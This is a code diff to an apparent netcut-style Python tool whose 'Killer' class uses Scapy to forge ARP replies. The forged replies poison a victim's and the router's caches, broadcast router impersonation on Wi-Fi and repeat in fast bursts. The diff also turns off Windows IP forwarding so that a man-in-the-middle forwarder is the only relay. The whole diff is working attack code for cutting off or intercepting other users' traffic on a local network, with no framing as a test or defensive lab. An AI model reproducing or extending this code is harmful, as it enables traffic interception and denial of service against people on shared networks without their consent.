@@ -60,6 +60,33 @@ def enable_ip_forwarding():
         pass
 
 
+def disable_ip_forwarding():
+    """Disable kernel IP forwarding so MITM forwarder is the only relay path."""
+    if not sys.platform.startswith('win'):
+        return
+    try:
+        try:
+            import winreg
+
+            key = winreg.OpenKey(
+                winreg.HKEY_LOCAL_MACHINE,
+                r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
+                0,
+                winreg.KEY_SET_VALUE,
+            )
+            winreg.SetValueEx(key, 'IPEnableRouter', 0, winreg.REG_DWORD, 0)
+            winreg.CloseKey(key)
+        except Exception:
+            pass
+        run_command(
+            ['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=disabled'],
+            shell=False,
+            timeout=12,
+        )
+    except Exception:
+        pass
+
+
 class Killer:
     def __init__(self, router=DUMMY_ROUTER):
         self.iface = get_default_iface()
@@ -281,6 +308,44 @@ class Killer:
         seq = int(self._op_seq.get(mac, 0))
         self._poison_arp_now(victim, seq, repeats=max(1, int(repeats)), delay_s=0)
 
+    def _iface_is_wireless(self) -> bool:
+        try:
+            from tools.mitm_probe import iface_is_wireless
+
+            return iface_is_wireless(self.iface)
+        except Exception:
+            return False
+
+    def _poison_frames(self, victim):
+        """Unicast ARP poison; on Wi‑Fi also broadcast router-impersonation to reach wired clients."""
+        to_victim = Ether(dst=victim['mac']) / ARP(
+            op=2,
+            psrc=self.router['ip'],
+            hwsrc=self.iface.mac,
+            pdst=victim['ip'],
+            hwdst=victim['mac'],
+        )
+        to_router = Ether(dst=self.router['mac']) / ARP(
+            op=2,
+            psrc=victim['ip'],
+            hwsrc=self.iface.mac,
+            pdst=self.router['ip'],
+            hwdst=self.router['mac'],
+        )
+        frames = [to_victim, to_router]
+        if self._iface_is_wireless():
+            frames.append(
+                Ether(dst='ff:ff:ff:ff:ff:ff')
+                / ARP(
+                    op=2,
+                    psrc=self.router['ip'],
+                    hwsrc=self.iface.mac,
+                    pdst=victim['ip'],
+                    hwdst=victim['mac'],
+                )
+            )
+        return frames
+
     def _poison_arp_now(self, victim, seq=0, repeats=1, delay_s=0.0):
         """Best-effort immediate ARP poison burst; aborts if a newer op supersedes this sequence.
 
@@ -299,28 +364,14 @@ class Killer:
             # until the ARP worker's first _get_socket() finished).
             self._poison_arp_now_async(victim, seq, repeats, delay_s)
             return
-        to_victim = Ether(dst=victim['mac'])/ARP(
-            op=2,
-            psrc=self.router['ip'],
-            hwsrc=self.iface.mac,
-            pdst=victim['ip'],
-            hwdst=victim['mac']
-        )
-
-        to_router = Ether(dst=self.router['mac'])/ARP(
-            op=2,
-            psrc=victim['ip'],
-            hwsrc=self.iface.mac,
-            pdst=self.router['ip'],
-            hwdst=self.router['mac']
-        )
+        frames = self._poison_frames(victim)
 
         for _ in range(max(1, int(repeats))):
             if self._op_seq.get(victim['mac']) != seq or victim['mac'] not in self.killed:
                 break
             try:
-                sock.send(to_victim)
-                sock.send(to_router)
+                for frame in frames:
+                    sock.send(frame)
             except Exception:
                 # Socket died mid-burst — let the threaded worker recover.
                 self._socket = None
@@ -338,25 +389,12 @@ class Killer:
                 iface = self.iface.guid if getattr(self.iface, 'guid', None) else self.iface.name
                 if not iface or iface == 'NULL':
                     return
-                to_victim = Ether(dst=victim['mac'])/ARP(
-                    op=2,
-                    psrc=self.router['ip'],
-                    hwsrc=self.iface.mac,
-                    pdst=victim['ip'],
-                    hwdst=victim['mac'],
-                )
-                to_router = Ether(dst=self.router['mac'])/ARP(
-                    op=2,
-                    psrc=victim['ip'],
-                    hwsrc=self.iface.mac,
-                    pdst=self.router['ip'],
-                    hwdst=self.router['mac'],
-                )
+                frames = self._poison_frames(victim)
                 for _ in range(max(1, int(repeats))):
                     if self._op_seq.get(victim['mac']) != seq or victim['mac'] not in self.killed:
                         break
-                    sendp(to_victim, iface=iface, verbose=0)
-                    sendp(to_router, iface=iface, verbose=0)
+                    for frame in frames:
+                        sendp(frame, iface=iface, verbose=0)
                     if delay_s > 0:
                         sleep(delay_s)
                 # Warm the persistent socket for the worker loop.
@@ -389,6 +427,7 @@ class Killer:
         iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
         if not iface_to_use or iface_to_use == 'NULL':
             return False
+        disable_ip_forwarding()
         fw = MitmForwarder(debug=debug)
         fw.start(
             victim=victim,
@@ -440,6 +479,7 @@ class Killer:
         iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
         if not iface_to_use or iface_to_use == 'NULL':
             return
+        disable_ip_forwarding()
         fw = MitmForwarder(debug=debug)
         fw.start(
             victim=victim,
@@ -463,31 +503,9 @@ class Killer:
 
     @threaded
     def _kill_arp_worker(self, victim, wait_after=2, seq=0):
-        # Send ARP reply (is-at) with proper Ethernet destination to poison caches
-        # Unicast to specific MAC, not broadcast - avoids switch storm detection
-
-        # Victim: tell victim that router IP is at our MAC
-        to_victim = Ether(dst=victim['mac'])/ARP(
-            op=2,
-            psrc=self.router['ip'],
-            hwsrc=self.iface.mac,
-            pdst=victim['ip'],
-            hwdst=victim['mac']
-        )
-
-        # Router: tell router that victim IP is at our MAC
-        to_router = Ether(dst=self.router['mac'])/ARP(
-            op=2,
-            psrc=victim['ip'],
-            hwsrc=self.iface.mac,
-            pdst=self.router['ip'],
-            hwdst=self.router['mac']
-        )
+        frames = self._poison_frames(victim)
 
         # Front-load several short-interval reasserts so a missed first poison
-        # only costs ~80 ms instead of the full ``wait_after`` (2 s). After the
-        # warmup we fall back to the steady-state cadence — ARP caches survive
-        # 30–120 s so the 2 s sleep is fine once the victim's cache is flipped.
         warmup_remaining = 4
         warmup_gap = 0.08
         while (
@@ -495,9 +513,8 @@ class Killer:
             and self.iface.name != 'NULL'
             and self._op_seq.get(victim['mac']) == seq
         ):
-            # Send packets using persistent socket
-            self._send_packet(to_victim)
-            self._send_packet(to_router)
+            for frame in frames:
+                self._send_packet(frame)
             if warmup_remaining > 0:
                 warmup_remaining -= 1
                 sleep(warmup_gap)
@@ -753,6 +770,8 @@ class Killer:
         fw = self.forwarders.pop(mac, None)
         if fw:
             fw.stop()
+        if not self.forwarders:
+            enable_ip_forwarding()
 
     def _enforce_pf_block(self, victim_ip: str):
         if victim_ip in self.pf_blocks:
